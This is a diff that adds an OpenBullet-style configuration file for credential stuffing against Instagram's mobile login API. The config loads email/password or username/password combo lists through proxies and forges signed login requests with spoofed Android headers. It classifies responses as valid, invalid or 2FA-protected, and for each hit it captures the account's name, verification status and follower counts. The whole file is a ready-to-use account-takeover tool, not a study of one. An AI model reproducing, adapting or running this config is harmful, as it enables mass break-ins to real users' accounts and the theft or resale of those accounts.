@@ -1,0 +1,132 @@
+[SETTINGS]
+{
+  "Name": "Instagram Config By oer2349",
+  "SuggestedBots": 170,
+  "MaxCPM": 0,
+  "LastModified": "2021-07-31T09:41:31.4199532+05:30",
+  "AdditionalInfo": "discord: why?#1337",
+  "Author": "oer2349",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION RandomString "?h?h?h?h?h?h?h?h-?h?h?h?h-?h?h?h?h-?h?h?h?h-?h?h?h?h?h?h?h?h?h?h?h?h" -> VAR "KON" 
+
+#Length FUNCTION Length "<ur>" -> VAR "Length" 
+
+#Device_ID FUNCTION RandomString "android-?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h" -> VAR "DID" 
+
+#Token_Get REQUEST GET "https://i.instagram.com/api/v1/accounts/login/" 
+  
+  HEADER "User-Agent: Instagram 25.0.0.26.136 Android (24/7.0; 480dpi; 1080x1920; samsung; SM-J730F; j7y17lte; samsungexynos7870)" 
+
+#Token PARSE "<COOKIES(csrftoken)>" LR "" "" -> VAR "TOK" 
+
+#Post_Field FUNCTION URLEncode "{\"_csrftoken\":\"<TOK>\",\"adid\":\"<KON>\",\"country_codes\":\"[{\\\"country_code\\\":\\\"1\\\",\\\"source\\\":[\\\"default\\\"]}]\",\"device_id\":\"<DID>\",\"google_tokens\":\"[]\",\"guid\":\"<KON>\",\"login_attempt_count\":0,\"password\":\"<PASS>\",\"phone_id\":\"<KON>\",\"username\":\"<USER>\"}" -> VAR "EN" 
+
+#Length_2 FUNCTION Length "<EN>" -> VAR "Lenght" 
+
+#Login_Post REQUEST POST "https://i.instagram.com/api/v1/accounts/login/" 
+  CONTENT "signed_body=9387a4ccde8c044515539b8249da655d63a73093eaf7c4b45fad126aa961e45b.<EN>&ig_sig_key_version=4" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Instagram 25.0.0.26.136 Android (24/7.0; 480dpi; 1080x1920; samsung; SM-J730F; j7y17lte; samsungexynos7870)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Cookie2: $Version=1" 
+  HEADER "Accept-Language: en-US" 
+  HEADER "X-IG-Capabilities: 3boBAA==" 
+  HEADER "X-IG-Connection-Type: WIFI" 
+  HEADER "X-IG-Connection-Speed: -1kbps" 
+  HEADER "X-IG-App-ID: 567067343352427" 
+  HEADER "Content-Length: <Lenght>" 
+  HEADER "Host: i.instagram.com" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "rur: ATN" 
+
+KEYCHECK 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "\"challenge_required\"" 
+    KEY "\"two_factor_required\": true," 
+  KEYCHAIN Failure OR 
+    KEY "\"The password you entered is incorrect. Please try again.\"" 
+    KEY "\"The username you entered doesn't appear to belong to an account. Please check your username and try again.\"," 
+    KEY "\"Invalid Parameters\"," 
+  KEYCHAIN Success OR 
+    KEY "\"logged_in_user\"" 
+
+#Username PARSE "<SOURCE>" JSON "username" CreateEmpty=FALSE -> CAP "Username" 
+
+#Full_Name PARSE "<SOURCE>" JSON "full_name" CreateEmpty=FALSE -> CAP "Full Name" 
+
+#Verified PARSE "<SOURCE>" JSON "is_verified" CreateEmpty=FALSE -> CAP "Verified" 
+
+#Followers_Post REQUEST GET "https://www.instagram.com/<Username>" 
+  
+  HEADER "User-Agent: Instagram 25.0.0.26.136 Android (24/7.0; 480dpi; 1080x1920; samsung; SM-J730F; j7y17lte; samsungexynos7870)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Cookie2: $Version=1" 
+  HEADER "Accept-Language: en-US" 
+  HEADER "X-IG-Capabilities: 3boBAA==" 
+  HEADER "X-IG-Connection-Type: WIFI" 
+  HEADER "X-IG-Connection-Speed: -1kbps" 
+  HEADER "X-IG-App-ID: 567067343352427" 
+  HEADER "Content-Length: <Lenght>" 
+  HEADER "Host: i.instagram.com" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "rur: ATN" 
+
+#Followers_Cap PARSE "<SOURCE>" LR "<meta content=\"" " Followers," -> VAR "Followers" 
+
+#Following_Cap PARSE "<SOURCE>" LR "Followers, " "Following," -> VAR "Following" 
+
+#Posts_Cap PARSE "<SOURCE>" LR "Following, " " Posts " -> VAR "Posts" 
+
+#Followers FUNCTION Constant "<Followers> Followers" -> CAP "Followers" 
+
+#Following FUNCTION Constant "<Following> Following" -> CAP "Following" 
+
+#Posts FUNCTION Constant "<Posts> Posts" -> CAP "Posts" 
+
+#Leecher_gonna_be_FUCKED_UP_THRICE FUNCTION Constant "🔥 SAVURDU 🔥" -> CAP "Config Made By" 
+
